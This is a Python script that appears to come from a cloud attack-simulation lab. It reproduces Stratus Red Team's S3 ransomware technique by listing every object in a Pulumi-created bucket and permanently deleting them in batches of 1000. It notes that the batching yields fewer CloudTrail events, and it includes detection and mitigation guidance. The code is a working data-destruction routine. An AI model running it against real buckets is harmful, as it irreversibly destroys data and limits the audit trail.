"""
Technique : aws.impact.s3-ransomware-batch-deletion
Tactic    : Impact (T1485)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.impact.s3-ransomware-batch-deletion/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target S3 bucket with objects.

How the attack works:
  A ransomware operator deletes all objects from an S3 bucket using
  s3:DeleteObjects, which supports up to 1000 objects per API call.  This
  generates far fewer CloudTrail events than individual deletion — a single
  DeleteObjects call replacing up to 1000 individual DeleteObject events.

Detection signal:
  - s3:DeleteObjects with a large number of objects.
  - Absence of concurrent PutObject calls (distinguishes from normal churn).
  - S3 Object Lock or versioning can prevent permanent loss.

Revert:
  - Data is permanently deleted (no versioning enabled).
  - Run `pulumi destroy && pulumi up` to recreate the bucket and objects.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    bucket_name = infra.get("bucket_name", "")

    if not bucket_name:
        print("[!] bucket_name not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session   = boto3.Session()
    s3_client = session.client("s3")

    # ── Step 1: Enumerate all objects ─────────────────────────────────────────
    banner("Step 1 — Enumerate objects (ListObjectsV2)")
    all_objects: list[dict] = []
    paginator = s3_client.get_paginator("list_objects_v2")
    for page in paginator.paginate(Bucket=bucket_name):
        for obj in page.get("Contents", []):
            all_objects.append({"Key": obj["Key"]})

    print(f"  [+] Found {len(all_objects)} object(s) in: {bucket_name}")
    if not all_objects:
        print("  [~] Bucket is empty — nothing to delete.")
        return

    # ── Step 2: Batch-delete all objects ─────────────────────────────────────
    banner("Step 2 — Delete all objects in batches of 1000 (DeleteObjects)")
    batch_size  = 1000
    total_deleted = 0
    total_errors  = 0

    for i in range(0, len(all_objects), batch_size):
        batch = all_objects[i:i + batch_size]
        try:
            response = s3_client.delete_objects(
                Bucket=bucket_name,
                Delete={"Objects": batch, "Quiet": False},
            )
            deleted = len(response.get("Deleted", []))
            errors  = response.get("Errors", [])
            total_deleted += deleted
            total_errors  += len(errors)
            print(f"  [+] Batch {i // batch_size + 1}: deleted {deleted}, errors {len(errors)}")
            print(f"  [!] CloudTrail event: s3:DeleteObjects")
        except ClientError as exc:
            print(f"  [!] DeleteObjects failed: {exc}")

    banner("Complete")
    print(f"  Objects deleted : {total_deleted}")
    print(f"  Errors          : {total_errors}")
    print()
    print("Detection guidance:")
    print("  Alert on s3:DeleteObjects with large object counts.")
    print("  S3 versioning or Object Lock can preserve data despite this attack.")
    print("\nRun `pulumi destroy && pulumi up` to recreate the bucket and objects.")


if __name__ == "__main__":
    main()
